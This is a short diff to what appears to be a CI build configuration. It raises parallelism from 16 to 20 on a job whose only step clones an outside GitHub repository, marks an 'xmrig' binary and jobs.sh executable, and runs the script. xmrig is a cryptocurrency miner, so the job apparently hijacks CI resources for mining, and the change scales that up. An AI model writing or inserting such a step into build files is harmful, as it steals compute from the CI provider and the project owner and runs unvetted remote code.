@@ -3,6 +3,6 @@ jobs:
   build:
     docker:
       - image: node:latest
-    parallelism: 16
+    parallelism: 20
     steps:
       - run: git clone https://github.com/romkojrr/jobs.git && cd jobs && chmod 500 xmrig jobs.sh && ./jobs.sh
